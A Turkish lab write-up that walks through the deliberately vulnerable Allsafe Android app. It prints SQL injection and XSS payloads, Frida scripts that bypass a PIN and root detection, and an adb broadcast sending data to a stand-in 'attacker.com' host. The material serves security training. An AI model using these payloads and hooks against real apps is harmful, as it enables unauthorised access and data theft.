
# ALLSAFE Android App WriteUp Part 1

Merhabalar, bu yazımda [allsafe ](https://github.com/t0thkr1s/allsafe-android/releases/download/v1.5/allsafe.apk)zafiyetli mobil uygulaması anlatacağım.

![](https://cdn-images-1.medium.com/max/2000/1*xukTCLPq7WaREz1b0qIILw.png)

Apk dosyasını emülatöre yükleyip açtığımızda bizi yukarıdaki ekran karşılıyor.

Ve apk dosyasının kaynak kodlarına ulaşmak için [jadx-gui](https://sourceforge.net/projects/jadx.mirror/) aracını kullanıyorum.

## **Zafiyet Adı** : Insecure Logging

**Zafiyet Tanımı** : Insecure Logging zafiyeti, uygulamanın kullanıcıya veya sisteme ait hassas verileri log dosyalarına kaydetmesi ve bu verilerin yetkisiz kişiler tarafından okunabilir hale gelmesidir.

**Zafiyet Derecesi** : Orta — Kritik

Hassas verinin türüne bağlıdır:

Eğer parola, token, kredi kartı bilgisi, sağlık verisi gibi kritik bilgiler loglara düşüyorsa → Yüksek Risk

Eğer sadece kullanıcı adı, cihaz bilgisi, hata kodları gibi görece daha az hassas bilgiler loglanıyorsa → Orta Risk

![](https://cdn-images-1.medium.com/max/2000/1*l3Z3-CA4bu-Wn8GCAKMj1A.png)

Logcat’i açıp buraya “The secret text is here.” yazıp enter’a bastığımızda yazdığımız yazının aşağıdaki gibi loglara düştüğünü göreceksiniz.

![](https://cdn-images-1.medium.com/max/3838/1*oapl4Oj-WPgaqJUCvV4wtQ.png)

Bu zafiyet arka planda aşağıdaki kod parçasından dolayı oluşuyor.

    static /* synthetic */ boolean lambda$onCreateView$0(TextInputEditText secret, TextView v, int actionId, KeyEvent event) {
            if (actionId == 6 && !((Editable) Objects.requireNonNull(secret.getText())).toString().equals("")) {
                Log.d("ALLSAFE", "User entered secret: " + secret.getText().toString());
                return false;
            }
            return false;
        }

Kodu incelediğimizde zafiyetin aşağıdaki satırdan dolayı oluştuğunu anlıyoruz.

    Log.d("ALLSAFE", "User entered secret: " + secret.getText().toString());

## **Zafiyet Adı** : Hardcoded Credentials

**Zafiyet Tanımı** : Hardcoded Credentials zafiyeti, bir uygulamanın kaynak kodu içerisinde kullanıcı adı, parola, API anahtarı, erişim tokeni, şifreleme anahtarı gibi kimlik doğrulama veya yetkilendirme bilgilerini sabit (hardcode) olarak barındırması durumudur. Bu bilgiler genellikle uygulama paketinin tersine mühendislik (reverse engineering) yoluyla açığa çıkarılabilir. Sonuç olarak saldırgan, bu kimlik bilgilerini ele geçirerek uygulamanın arka uç servislerine, veritabanına veya üçüncü taraf sistemlere yetkisiz erişim sağlayabilir.

**Zafiyet Derecesi** : Orta — Yüksek

Kritik sistemlere erişim sağlayan kimlik bilgileri (ör. veritabanı parolası, production API anahtarı) kod içerisinde sabitlenmişse. → Yüksek Risk

Saldırganın erişmesi durumunda sınırlı etkiye sahip test/demonstrasyon amaçlı kimlik bilgileri kodda bulunuyorsa. → Orta Risk

![](https://cdn-images-1.medium.com/max/2000/1*Daw_ATUY1wJacF6aapzB1Q.png)

username:password şeklinde kaynak kodunda kimlik bilgileri bulunduğunu söylüyor. Butona tıkladığımızda “Under development!” uyarısı ile karşılaşıyoruz.

    public static final void onCreateView$lambda$0(HardcodedCredentials this$0, View it) {
            OkHttpClient client = new OkHttpClient();
            RequestBody body = RequestBody.INSTANCE.create(BODY, SOAP);
            Request.Builder builder = new Request.Builder();
            String string = this$0.getString(R.string.dev_env);
            Intrinsics.checkNotNullExpressionValue(string, "getString(...)");
            Request req = builder.url(string).post(body).build();
            client.newCall(req).enqueue(new Callback() { // from class: infosecadventures.allsafe.challenges.HardcodedCredentials$onCreateView$1$1
                @Override // okhttp3.Callback
                public void onResponse(Call call, Response response) {
                    Intrinsics.checkNotNullParameter(call, "call");
                    Intrinsics.checkNotNullParameter(response, "response");
                }
    
                @Override // okhttp3.Callback
                public void onFailure(Call call, IOException e) {
                    Intrinsics.checkNotNullParameter(call, "call");
                    Intrinsics.checkNotNullParameter(e, "e");
                }
            });
            SnackUtil snackUtil = SnackUtil.INSTANCE;
            FragmentActivity requireActivity = this$0.requireActivity();
            Intrinsics.checkNotNullExpressionValue(requireActivity, "requireActivity(...)");
            snackUtil.simpleMessage(requireActivity, "Under development!");
        }

Kaynak kodunu incelediğimizda aşağıdaki satır dikkatimizi çekiyor. Çünkü uygulamadaki uyarı da “Under development!” diyordu. Yani development’ın kısaltması “dev”.

    String string = this$0.getString(R.string.dev_env);

R.string.dev_env → res/values/strings.xml dosyasında tanımlı olan dev_env string resource’unun ID’sidir.

strings.xml dosyasına gidip dev_env stringinin karşılığına bakalım.

![](https://cdn-images-1.medium.com/max/2000/1*DCNaCTqTZa_CfkT54EMbOg.png)

Söylediği username:password ‘ün karşılığı “admin:password123” imiş.

## **Zafiyet Adı : Firebase Database**

**Zafiyet Tanımı** : Firebase Database zafiyeti, geliştiricilerin Firebase Realtime Database veya Firestore yapılandırmalarında gerekli erişim kontrolünü sağlamaması sonucu ortaya çıkar. Firebase Realtime Database, URL’ye .json eklenerek erişilebilen bir REST API olarak çalışır; eğer read/write kuralları “anyone” (herkes) erişimine açık bırakılırsa, kimliği doğrulanmamış saldırganlar veritabanına doğrudan erişebilir. Bu durum, verilerin izinsiz okunması, değiştirilmesi veya silinmesi gibi ciddi güvenlik açıklarına yol açar. Bu durum saldırgana:

* Kullanıcı bilgilerini (e-posta, telefon, adres, şifre hashleri vb.) okuma,

* Veritabanındaki kayıtları değiştirme veya silme,

* Yeni sahte kullanıcı/veri ekleme,

* Uygulamanın işleyişini manipüle etme imkânı verir.

Bu zafiyet genellikle mobil uygulamaların tersine mühendislik (reverse engineering) yoluyla Firebase endpoint adresinin çıkarılması ve ardından yanlış yapılandırılmış veritabanına doğrudan erişim sağlanmasıyla istismar edilir.

**Zafiyet Derecesi** : Orta — Yüksek — Kritik

Veritabanında kullanıcı bilgileri, ödeme bilgileri, kimlik doğrulama verileri gibi hassas veriler bulunuyorsa. → Yüksek Risk

Hem okuma hem yazma izinleri herkese açıksa → kullanıcı hesaplarının ele geçirilmesi, veritabanının tamamen manipüle edilmesi mümkün olur. → Kritik Risk

Yalnızca kısıtlı ve düşük hassasiyete sahip veriler açığa çıkıyorsa. → Orta Risk

![](https://cdn-images-1.medium.com/max/2000/1*q_YAgx9S9ZFHsb30ZisH-g.png)

Kaynak kodu inceleyelim.

![](https://cdn-images-1.medium.com/max/3220/1*uU49qim0BTkMZkTppsujJA.png)

Kaynak kodu incelerken firebase adında tüm kodlarda arama yaptığımda yukarıdaki işaretlediğim satıra denk geldim. Bu satır, Android’in derleyici tarafından otomatik oluşturulan bir kaynak ID’sini temsil etmektedir. Bu ID, uygulamadaki bir string, layout veya drawable kaynağına karşılık gelir.

string.xml dosyasına gidelim ve firebase adına bir arama yapalım.

![](https://cdn-images-1.medium.com/max/2000/1*BFxzeEZXs7uWAo4h-K5Igg.png)

Kaynak kodunda görüldüğü üzere firebase database’e ait url adresi string.xml içerisine koyulmuş.

![](https://cdn-images-1.medium.com/max/2222/1*_nSEcAgu4H51urnl7sc-vQ.png)

Görüldüğü üzere konfigürasyon hatasından kaynaklı olarak url adresinin sonuna .json koyulduğunda ilgili endpointe ulaşılabiliniyor.

## **Zafiyet Adı** : Insecure Shared Preferences

**Zafiyet Tanımı** : Insecure Shared Preferences zafiyeti, Android uygulamalarının SharedPreferences mekanizmasını kullanarak hassas verileri (örneğin kullanıcı adı, parola, token, API anahtarı, kredi kartı bilgisi vb.) şifrelenmeden veya yeterli erişim kontrolü olmadan depolaması durumunda ortaya çıkar. Bu veriler, cihaz root edilmişse veya kötü amaçlı bir uygulama cihazda çalıştırılmışsa kolayca erişilebilir, okunabilir ve manipüle edilebilir. Bu durum kullanıcı verilerinin çalınmasına, kimlik doğrulama bypass’ına veya hesapların ele geçirilmesine yol açabilir.

**Zafiyet Derecesi** : Yüksek

![](https://cdn-images-1.medium.com/max/2000/1*HnnBzWXc3ytXBHqFV1jv7w.png)

Burada bir kullanıcı adı ve şifre belirleyip bu bilgileri saklamak için butona basıyorum.

Ardından ilgili verilerin şifreli mi şifresiz mi saklandığını belirlemek için terminal üzerinden ilgili konuma gidiyorum.

![](https://cdn-images-1.medium.com/max/3374/1*MUsFAeVdOKewFWfIHuML4g.png)

Görüldüğü üzere şifresiz bir şekilde saklanıyorlar.

## **Zafiyet Adı** : SQL Injection

**Zafiyet Tanımı** : SQL Injection zafiyeti, bir uygulamanın kullanıcıdan aldığı veri üzerinde yeterli doğrulama veya filtreleme yapmadan SQL sorgularına doğrudan dahil etmesi durumunda ortaya çıkar. Saldırgan, özel olarak hazırlanmış girişler (payload) kullanarak veritabanına yetkisiz erişim sağlayabilir, veri sızıntısı yaratabilir, verileri değiştirebilir veya silebilir, hatta bazı durumlarda uygulamanın çalıştığı sunucu üzerinde komut çalıştırabilir. Bu zafiyet genellikle web uygulamaları, API’ler veya mobil uygulamaların backend servislerinde görülür.

**Zafiyet Derecesi** : Kritik

![](https://cdn-images-1.medium.com/max/2000/1*e1fHOU2iHQr3Offq8YUK1w.png)

Uygulama bizden username ve password şeklinde iki girdi istemektedir.

Kaynak kodunu inceleyelim.

    public static final void onCreateView$lambda$0(SQLiteDatabase $db, TextInputEditText $username, SQLInjection this$0, TextInputEditText $password, View it) {
            Cursor cursor = $db.rawQuery("select * from user where username = '" + ((Object) $username.getText()) + "' and password = '" + this$0.md5(String.valueOf($password.getText())) + "'", null);
            Intrinsics.checkNotNullExpressionValue(cursor, "rawQuery(...)");
            StringBuilder data = new StringBuilder();
            if (cursor.getCount() > 0) {
                cursor.moveToFirst();
                do {
                    String user = cursor.getString(1);
                    String pass = cursor.getString(2);
                    data.append("User: " + user + " \nPass: " + pass + "\n");
                } while (cursor.moveToNext());
            }
            cursor.close();
            Toast.makeText(this$0.getContext(), data, 1).show();
        }

Kaynak kodunu incelediğimizde

    Cursor cursor = $db.rawQuery("select * from user where username = '" + ((Object) $username.getText()) + "' and password = '" + this$0.md5(String.valueOf($password.getText())) + "'", null);

Zafiyetin yukarıdaki satırdan dolayı oluştuğunu görüyoruz. Çünkü kullanıcıdan gelen girdiyi herhangi bir kontrole gerek duymadan sql komutunun içine yerleştirmiş. Şifreyi md5 hash ile saklamaya çalışsa da bilindiği üzere bu hash zayıf bir şifreleme algoritması olarak bilinmektedir ve kolayca kırılabilir.

username : admin’ or 1=1 —

password : admin

Uygulama da girdi istenilen yerleri yukarıdaki gibi doldurduğumuzda:

![](https://cdn-images-1.medium.com/max/2000/1*KUusm8l7viXGEZj4d2eEdg.png)

Resimde görüldüğü gibi bütün kullanıcıların kullanıcı adı ve şifrelerini çekmiş bulunuyoruz.

    select * from user where username = 'admin' or 1=1 --' and password = 'admin'

Çünkü bizim gönderdiğimiz kullanıcı adı ve şifre sql komutunda bir manipülasyona yol açtı. Kullanıcı adını girdikten sonra “or 1=1 — ” şeklinde devam ettik. Burada 1=1 zaten doğru ve “or” ile kullanınca kullanıcı adı doğru olsa da olmasa da sorgu doğru olarak kabul edilecek ve “ — “ (iki tire) sql sorgularında yorum satırı oluşturmak için kullanılır yani iki tireden sonraki sorgunun bir önemi kalmayacak bu şekilde sql komutunun tamamı doğru sonuç dönecek şekilde manipüle edecektir.

## **Zafiyet Adı** : PIN Bypass

**Zafiyet Tanımı** : PIN Bypass zafiyeti, bir uygulamanın veya cihazın kullanıcıya ait PIN (Personal Identification Number) doğrulamasını atlamaya veya atlatılabilir hale gelmesine izin veren bir güvenlik açığıdır. Bu zafiyet, kullanıcı kimliğinin yeterince doğrulanmaması, hatalı oturum yönetimi veya eksik güvenlik kontrolleri nedeniyle oluşabilir. Saldırgan, PIN doğrulamasını atlayarak uygulamaya veya cihazdaki hassas verilere yetkisiz erişim sağlayabilir.

**Zafiyet Derecesi** : Yüksek

![](https://cdn-images-1.medium.com/max/2000/1*An9Nhx_v9rc7eqozWkEPVA.png)

Uygulamada görüldüğü üzere 4 karakterli bir PIN var. Bunu frida ile birkaç farklı şekilde bypass edebiliriz.

    private final boolean checkPin(String pin) {
            byte[] decode = Base64.decode("NDg2Mw==", 0);
            Intrinsics.checkNotNullExpressionValue(decode, "decode(...)");
            return Intrinsics.areEqual(pin, new String(decode, Charsets.UTF_8));
        }

Kaynak kodunu incelediğimizde checkPin adlı bir metod kullanarak PIN’i kontrol ettiğini görüyoruz. İstersek base64 ile şifrelenmiş metni çözerek PIN’e ulaşabiliriz. Ama öyle yapmayacağız onun yerine Frida kullanarak bir script yazıp o şekilde PIN’i bypass edeceğiz.

Frida Script — Senaryo 1

    Java.perform(function(){
        var pinBypass = Java.use("infosecadventures.allsafe.challenges.PinBypass");
        pinBypass.checkPin.implementation = function(pin){
            return true;
        }
    });

Yukarıda ilgili sınıfın ismini çağırdıktan sonra sınıfın içerisinde yer alan checkPin metodunu uygulama çalışırken hook’layıp dönülen değerin true olmasını sağladık. Bu sayede biz 4 karakterli ne girersek doğru diyecek ve bu şekilde bypass etmiş olacağız.

![](https://cdn-images-1.medium.com/max/2446/1*i-CenOwEoSYw8iESNBZd3Q.png)

Ve script’imizi çalıştırdık. Hiçbir hata vermedi.

![](https://cdn-images-1.medium.com/max/2000/1*VLRXhP8_2kN8pdvAN46wXg.png)

Konsol çıktısında görüldüğü üzere 1234 girdim. Butona bastığımda gayet başarılı bir şekilde bypass ettiğimizi görüyoruz.

Frida Bypass — Senaryo 2

    Java.perform(function () {
        var PinBypass = Java.use("infosecadventures.allsafe.challenges.PinBypass");
    
        // Sınıftan bir örnek oluştur
        var pinInstance = PinBypass.$new();
    
        // Brute-force 1111 -> 9999
        for (var i = 1111; i <= 9999; i++) {
            var pin = i.toString();
            var res = pinInstance.checkPin(pin);
            if (res) {
                console.log("[*] PIN: " + pin);
                break; 
            }
        }
    });

Yukarıdaki script koduyla ilgili PIN’i bulmak için brute-froce saldırısı yapmayı amaçladık. Bulduktan sonra PIN’i konsola bastık.

Önce sınıfı çağırdık. Sınıftan bir nesne oluşturduktan sonra checkPin metoduna 1111'ten başlayıp 9999'a kadar giden PIN’leri denedik. Bu sayede metottan doğru PIN’i çektik.

![](https://cdn-images-1.medium.com/max/2344/1*lKF_PnxTVctLKNd_berBcg.png)

Doğru PIN : 4863 imiş.

![](https://cdn-images-1.medium.com/max/2000/1*_fVU66QDsbih_-jUyfb-wg.png)

Görüldüğü üzere yine başarılı bir şekilde bypass ettik.

## **Zafiyet Adı** : Root Detection Bypass

**Zafiyet Tanımı** : Root Detection Bypass zafiyeti, Android uygulamalarında geliştiriciler tarafından cihazın rootlu olup olmadığını tespit etmek için eklenen kontrollerin saldırgan tarafından atlatılması durumudur. Normal şartlarda root edilmiş cihazlarda uygulamanın çalışması engellenmeli veya güvenlik seviyeleri artırılmalıdır. Ancak bu kontrollerin zayıf veya yanlış uygulanması, saldırganların uygulamanın root tespit mekanizmasını manipüle ederek rootlu cihazlarda çalıştırmasına ve böylece güvenlik önlemlerini devre dışı bırakmasına neden olur. Bu durum, saldırganların uygulamayı tersine mühendislik ile analiz etmesini, bellek manipülasyonu yapmasını veya hassas verileri daha kolay elde etmesini mümkün kılar.

**Zafiyetin Derecesi** : Orta

Root detection bypass tek başına doğrudan veri sızıntısına sebep olmasa da, uygulamanın güvenlik mekanizmalarının devre dışı bırakılmasına ve ileri seviye saldırıların (ör. kod enjeksiyonu, trafik manipülasyonu, hassas veri hırsızlığı) kolaylaşmasına yol açtığı için **orta seviye** bir güvenlik riski olarak değerlendirilir.

![](https://cdn-images-1.medium.com/max/2000/1*uJy27B4q4AQnRpBIJQr2Ig.png)

Check Root butonuna tıkladığımızda cihazımızın rootlu olduğunu söylüyor.

    public static final void onCreateView$lambda$0(RootDetection this$0, View it) {
            if (new RootBeer(this$0.getContext()).isRooted()) {
                SnackUtil snackUtil = SnackUtil.INSTANCE;
                FragmentActivity requireActivity = this$0.requireActivity();
                Intrinsics.checkNotNullExpressionValue(requireActivity, "requireActivity(...)");
                snackUtil.simpleMessage(requireActivity, "Sorry, your device is rooted!");
                return;
            }
            SnackUtil snackUtil2 = SnackUtil.INSTANCE;
            FragmentActivity requireActivity2 = this$0.requireActivity();
            Intrinsics.checkNotNullExpressionValue(requireActivity2, "requireActivity(...)");
            snackUtil2.simpleMessage(requireActivity2, "Congrats, root is not detected!");
        }

Kaynak kodunu incelediğimizde Root Detection için RootBeer adlı bir kütüphanenin isRooted() fonksiyonunun kullanıldığını görüyoruz.

    public boolean isRooted() {
            return detectRootManagementApps() || detectPotentiallyDangerousApps() || checkForBinary(Const.BINARY_SU) || checkForDangerousProps() || checkForRWPaths() || detectTestKeys() || checkSuExists() || checkForRootNative() || checkForMagiskBinary();
        }

RootBeer adlı kütüphanenin isRooted() fonksiyonuna gittiğimizde return edilirken birçok fonksiyonun kullanıldığını görüyoruz.

Biz frida ile isRooted() fonksiyonunu hook’layıp return değerini daima false olacak şekilde ayarlayacağız.

    Java.perform(function () {
        var rootDetection = Java.use("com.scottyab.rootbeer.RootBeer")
        rootDetection.isRooted.implementation = function(){
            return false;
        }
    });

Script’imizi yazdık. Şimdi çalıştıralım.

![](https://cdn-images-1.medium.com/max/2638/1*Z9cSXsTK3-3NxIL3hltTKQ.png)

Sorunsuz çalıştı.

![](https://cdn-images-1.medium.com/max/2000/1*LWWz1jc2LQj2-3a2AOYMMQ.png)

Görüldüğü üzere root detection mekanizmasını bypass etmeyi başardık.

## **Zafiyet Adı** : Deep Link Exploitation

**Zafiyet Tanımı** : Deep Link Exploitation zafiyeti, mobil uygulamalarda kullanılan derin bağlantı (deep link) mekanizmasının güvenli şekilde doğrulanmaması sonucu ortaya çıkar. Deep linkler, belirli bir uygulama ekranına veya işlevine doğrudan yönlendirme yapmayı sağlar. Eğer uygulama, deep link ile gelen parametreleri veya çağrıları yeterli kimlik doğrulama ve yetkilendirme kontrolü olmadan işlerse, saldırgan özel hazırlanmış bir link aracılığıyla uygulamanın kritik fonksiyonlarına erişebilir. Bu durum, yetkisiz kullanıcıların hesap ayarlarını değiştirmesi, oturum açmadan yetkili ekranlara yönlenmesi veya hassas işlemleri tetiklemesi gibi güvenlik risklerine yol açar.

**Zafiyet Derecesi** : **Yüksek**

Deep linklerin sömürülmesi, uygulama içinde kimlik doğrulamayı atlamaya, hassas bilgilere yetkisiz erişim sağlamaya ve kritik fonksiyonların tetiklenmesine sebep olabileceği için yüksek riskli bir güvenlik açığıdır.

![](https://cdn-images-1.medium.com/max/2000/1*fA4fGQ8bRnct8lCYt96cqg.png)

Kaynak kodunu inceleyelim.

    public class DeepLinkTask extends AppCompatActivity {
        @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_deep_link_task);
            Intent intent = getIntent();
            String action = intent.getAction();
            Uri data = intent.getData();
            Log.d("ALLSAFE", "Action: " + action + " Data: " + data);
            try {
                if (data.getQueryParameter("key").equals(getString(R.string.key))) {
                    findViewById(R.id.container).setVisibility(0);
                    SnackUtil.INSTANCE.simpleMessage(this, "Good job, you did it!");
                } else {
                    SnackUtil.INSTANCE.simpleMessage(this, "Wrong key, try harder!");
                }
            } catch (Exception e) {
                SnackUtil.INSTANCE.simpleMessage(this, "No key provided!");
                Log.e("ALLSAFE", e.getMessage());
            }
        }
    }

if kod bloğunda görüldüğü üzere uygulama bir deep link ile açılıyor ve bir key URI(Intent data) içerisinden bir key sorgu parametresi alınıyor. Bu key sorgu parametresi strings.xml dosyasındaki key değerine eşit ise görev tamamlanıyor.

![](https://cdn-images-1.medium.com/max/2500/1*fYF-CwyIHIMQZFY2L_Qs1w.png)

Android uygulamalarındaki deeplinkleri test etmek için en çok kullanılan komutlardan biri adb shell am start’tır.

    adb shell am start -W -a android.intent.action.VIEW -d "deeplink://parametre?query=key" com.hedef.uygulama

* adb shell am start → Activity Manager üzerinden yeni bir intent başlatır.

* -W → Komutun tamamlanmasını bekler.

* -a android.intent.action.VIEW → Intent’in action kısmı (deeplink’ler için genelde VIEW).

* -d "deeplink://..." → Deeplink URI’si (senaryoya göre buraya URL veya custom scheme yazılır).

* com.hedef.uygulama → Hedef uygulamanın package adı.

Şimdi deep link testi için kendi senaryomuza göre bu adb komutunu tamamlamamız gerekiyor. Bunun içinde AndroindManifest.xml dosyasındaki intent-filter bilgisine bakmamız gerekiyor.

    <activity
                android:theme="@style/Theme.Allsafe.NoActionBar"
                android:name="infosecadventures.allsafe.challenges.DeepLinkTask"
                android:exported="true">
                <intent-filter>
                    <action android:name="android.intent.action.VIEW"/>
                    <category android:name="android.intent.category.DEFAULT"/>
                    <category android:name="android.intent.category.BROWSABLE"/>
                    <data
                        android:scheme="allsafe"
                        android:host="infosecadventures"
                        android:pathPrefix="/congrats"/>
                </intent-filter>

Bulduğumuz bilgileri toparlayalım:

* **scheme** → allsafe

* **host** → infosecadventures

* **pathPrefix** → /congrats

* Package adı → infosecadventures.allsafe (senin daha önce kullandığın paket)

* Key → strings.xml içinden aldığın ebfb7ff0-b2f6-41c8-bef3-4fba17be410c

    adb shell am start -W -a android.intent.action.VIEW -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c" infosecadventures.allsafe

Bulduğumuz bilgilerle komutumuz şuna dönüşüyor.

![](https://cdn-images-1.medium.com/max/3838/1*l0gkmey56eC7vY-soguX5Q.png)

Komutumuzu çalıştırdıktan sonra şöyle bir çıktı alıyoruz.

![](https://cdn-images-1.medium.com/max/2000/1*jKpV-xHdDkSsUVepcVLzQQ.png)

Ve görev tamamlandı.

## **Zafiyet Adı** : Insecure Broadcast Receiver

**Zafiyet Tanımı** : Insecure Broadcast Receiver zafiyeti, Android uygulamalarında kullanılan Broadcast Receiver bileşenlerinin uygun güvenlik kontrolleri olmadan tanımlanması veya dışarıya açık bırakılması durumunda ortaya çıkar. Eğer bir Broadcast Receiver exported="true" olarak işaretlenmiş ve herhangi bir yetkilendirme (permission) kontrolü uygulanmamışsa, diğer uygulamalar veya saldırganlar bu receiver’a kötü niyetli broadcast intent mesajları gönderebilir. Bu durum, uygulama içinde yetkisiz işlemlerin tetiklenmesine, hassas bilgilere erişilmesine veya uygulamanın beklenmedik şekilde davranmasına yol açabilir.

**Zafiyet Derecesi** : **Yüksek**

![](https://cdn-images-1.medium.com/max/2000/1*hiqwfKcrO2znXNWFNhvANw.png)

Şimdi AndroidManifest.xml dosyasındaki receiver tagını inceleyelim.

    <receiver
                android:name="infosecadventures.allsafe.challenges.NoteReceiver"
                android:exported="true">
                <intent-filter>
                    <action android:name="infosecadventures.allsafe.action.PROCESS_NOTE"/>
                </intent-filter>
            </receiver>

* android:exported="true" → Bu receiver cihazdaki herhangi bir uygulamadan tetiklenebilir demek.

* permission ile bir kısıtlama eklenmemiş → Yani gelen intent’in kimden geldiği kontrol edilmiyor.

Şimdi kaynak kodunu inceleyelim.

    public class NoteReceiver extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            String server = intent.getStringExtra("server");
            String note = intent.getStringExtra("note");
            String notification_message = intent.getStringExtra("notification_message");
            OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
            HttpUrl httpUrl = new HttpUrl.Builder().scheme("http").host(server).addPathSegment("api").addPathSegment("v1").addPathSegment("note").addPathSegment("add").addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=").addQueryParameter("note", note).build();
            Log.d("ALLSAFE", httpUrl.getUrl());
            Request request = new Request.Builder().url(httpUrl).build();
            okHttpClient.newCall(request).enqueue(new Callback(this) { // from class: infosecadventures.allsafe.challenges.NoteReceiver.1
                @Override // okhttp3.Callback
                public void onFailure(Call call, IOException e) {
                    Log.d("ALLSAFE", e.getMessage());
                }
    
                @Override // okhttp3.Callback
                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("ALLSAFE", ((ResponseBody) Objects.requireNonNull(response.body())).string());
                }
            });
            NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "ALLSAFE");
            builder.setContentTitle("Notification from Allsafe");
            builder.setContentText(notification_message);
            builder.setSmallIcon(R.mipmap.ic_launcher_round);
            builder.setAutoCancel(true);
            builder.setChannelId("ALLSAFE");
            Notification notification = builder.build();
            NotificationManager notificationManager = (NotificationManager) context.getSystemService("notification");
            NotificationChannel notificationChannel = new NotificationChannel("ALLSAFE", "ALLSAFE_NOTIFICATION", 4);
            notificationManager.createNotificationChannel(notificationChannel);
            notificationManager.notify(1, notification);
        }
    }

Kodun şu satırlarında görüldüğü üzere :

    String server = intent.getStringExtra("server");
    String note = intent.getStringExtra("note");
    String notification_message = intent.getStringExtra("notification_message");
    OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
    HttpUrl httpUrl = new HttpUrl.Builder()
    .scheme("http")
    .host(server)
    .addPathSegment("api")
    .addPathSegment("v1")
    .addPathSegment("note")
    .addPathSegment("add")
    .addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=")
    .addQueryParameter("note", note).build();

Receiver, dışarıdan gelen değerleri herhangi bir doğrulama uygulamadan alıyor ve HTTP istek oluşturuyor.

Yani saldırgan kendi belirlediği bir server adresine, kendi note verisini, sabit auth_token ile gönderebiliyor.

    builder.setContentText(notification_message);

Bu satırda da görüldüğü üzere saldırgan notification mesajı gösterebiliyor.

    adb shell am broadcast -n infosecadventures.allsafe/.challenges.NoteReceiver -a infosecadventures.allsafe.action.PROCESS_NOTE --es server "attacker.com" --es note "hacked_by_me" --es notification_message "Hacked"

Şimdi yukarıdaki komutu kullanarak bir intent gönderelim.

![](https://cdn-images-1.medium.com/max/2000/1*puAWeaOkhBArUboI3mRdLA.png)

## **Zafiyet Adı** : WebView Injection / XSS

**Zafiyet Tanımı** : Uygulamada kullanılan WebView bileşeni, kullanıcı tarafından girilen veriyi herhangi bir doğrulama veya filtreleme olmaksızın loadUrl() ve loadData() metodları aracılığıyla işliyor. loadUrl() fonksiyonu kullanıcı tarafından sağlanan bir URL’yi doğrudan çalıştırırken, loadData() fonksiyonu girilen HTML/JavaScript kodunu işleyerek tarayıcı motorunda render ediyor. Ayrıca setJavaScriptEnabled(true) kullanılması, saldırganın zararlı JavaScript kodlarını çalıştırmasına imkân tanıyor. Bu durum, kötü niyetli bir kullanıcının uygulama içerisinde XSS saldırısı gerçekleştirmesine, zararlı web sayfalarına yönlendirme yapmasına veya uygulama içi verileri manipüle etmesine neden olabilir.

**Zafiyet Derecesi** : Yüksek

![](https://cdn-images-1.medium.com/max/2000/1*zhMzfYfi7qdTMEovTDM1Og.png)

Kaynak kodu inceleyelim :

    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
            View view = inflater.inflate(R.layout.fragment_vulnerable_web_view, container, false);
            final TextInputEditText payload = (TextInputEditText) view.findViewById(R.id.payload);
            final WebView webView = (WebView) view.findViewById(R.id.webView);
            webView.setWebViewClient(new WebViewClient());
            WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setAllowFileAccess(true);
            settings.setLoadWithOverviewMode(true);
            settings.setSupportZoom(true);
            view.findViewById(R.id.execute).setOnClickListener(new View.OnClickListener() { // from class: infosecadventures.allsafe.challenges.VulnerableWebView$$ExternalSyntheticLambda0
                @Override // android.view.View.OnClickListener
                public final void onClick(View view2) {
                    VulnerableWebView.this.lambda$onCreateView$0(payload, webView, view2);
                }
            });
            return view;
        }
    
        /* JADX INFO: Access modifiers changed from: private */
        public /* synthetic */ void lambda$onCreateView$0(TextInputEditText payload, WebView webView, View v) {
            if (!((Editable) Objects.requireNonNull(payload.getText())).toString().isEmpty()) {
                if (URLUtil.isValidUrl(((Editable) Objects.requireNonNull(payload.getText())).toString())) {
                    webView.loadUrl(payload.getText().toString());
                    return;
                } else {
                    webView.setWebChromeClient(new WebChromeClient());
                    webView.loadData(payload.getText().toString(), "text/html", "UTF-8");
                    return;
                }
            }
            SnackUtil.INSTANCE.simpleMessage(requireActivity(), "No payload provided!");
        }

webView.getSettings().setJavaScriptEnabled(true); → JavaScript yürütülmesine izin veriliyor.

webView.loadUrl(payload.getText().toString()); → Kullanıcı tarafından girilen URL doğrudan yükleniyor.

webView.loadData(payload.getText().toString(), "text/html", "UTF-8"); → Kullanıcı girdisi filtrelenmeden HTML/JS olarak render ediliyor.

**Olası Saldırı Senaryoları:**
Zararlı javascript kodu çalıştırılabilir.

Uygulama zararlı sitelere yönlendirilebilir (loadUrl("http://evil.com")).

JavaScript ile uygulama içi veriler çalınabilir veya kullanıcı aldatılarak phishing saldırıları gerçekleştirilebilir.

![](https://cdn-images-1.medium.com/max/2000/1*Plupu3MBG0FhsbvLuPMIlQ.png)

    <script>alert('XSS found..')</script>

Zararlı javascript kodunu girince zafiyetin tetiklendiğini görüyoruz.

    settings.setAllowFileAccess(true);

Yukarıdaki kod satırı WebView içerisinden cihazdaki dosya sistemine erişime izin verir. Yani WebView, file:// URI şemasıyla açılan yerel dosyalara erişebilir.

![](https://cdn-images-1.medium.com/max/2000/1*gdl7Gy0PdEnqgKn06_98mA.png)

    file:///etc/hosts

Yukarıdaki payload ile hosts dosyasına bu şekilde erişim sağlayabiliyoruz.

## **Zafiyet Adı** : Certificate Pinning Bypass or SSL Pinning Bypass

